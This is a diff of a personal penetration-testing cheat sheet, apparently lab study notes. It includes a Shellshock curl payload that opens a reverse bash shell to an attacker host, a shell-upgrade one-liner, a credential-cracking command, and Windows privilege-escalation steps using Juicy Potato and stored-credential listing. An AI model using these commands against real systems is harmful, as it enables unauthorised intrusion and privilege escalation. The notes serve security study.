@@ -100,7 +100,7 @@
     * Shellshock simple (remember to configure listenner):
 
         ```
-        curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTOM/cgi-bin/admin.cgi
+        curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTIM/cgi-bin/admin.cgi
         ```
 
 ## Reverse Sheel
@@ -120,7 +120,7 @@
 
 ## After first shell
 
-* Python pty (almost always work on Linux):
+* Getting TTY (almost always work on Linux):
 
     ```
     python -c 'import pty; pty.spawn("/bin/bash")'
@@ -234,20 +234,58 @@
     /usr/sbin/unshadow passwd_file.txt shadow_file.txt > <OUT_FILE>
     ```
 
-
-## Reverse Sheel
+## Privilege escalation
 
 ### Windows
 
+* User information:
+    ```
+    net user <USERNAME>
+    ```
+    and
+    ```
+    whoami /priv
+    ```
+* Stored credentials:
+    ```
+    cmdkey /list
+    ```
+
+* List hidden files:
+    ```
+    dir /a
+    ```
+
+* Winpeas (be careful, this tool can be forbidden):
+
+    https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+
 * Juicy potato:
+
+    0. Checking if you can use on cmd:
+
+        ```
+        whoami /priv
+        ```
+        or
+        ```
+        whoami /all
+        ```
+        or, if you decide to use meterpreter:
+        ```
+        meterpreter > getprivs
+        ```
+
+
+        If the output contains **SeImpersonatePrivilege** and **SeAssignPrimaryToken**, probably you can use this method!
 
     1. How to use: http://ohpe.it/juicy-potato/
     2. List of CLSIDs: http://ohpe.it/juicy-potato/CLSID/
     3. Executables:
-        * x86: https://github.com/ivanitlearning/Juicy-Potato-x86/releases (also see folder of machine Public 73)
+        * x86: https://github.com/ivanitlearning/Juicy-Potato-x86/releases (also see folder of machine **Public 73**)
         * x64: https://github.com/ohpe/juicy-potato/releases/tag/v0.1 (oficial github)
     4. More tips: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
-    5. Machines that helps: disco (Public 13) and Public 73. I used metasploit on disco machine.
+    5. Machines that helps: **disco (Public 13)** and **Public 73**. I used metasploit on disco machine, see the report.
     6. How to find CLSID: http://ohpe.it/juicy-potato/Test/ (I did not try this script yet)
     7. After upload the correct executable to target and find the correct CLSID:
 
@@ -258,3 +296,6 @@
         ```
 
 ### Linux
+
+* LinEnum:
+    https://github.com/rebootuser/LinEnum
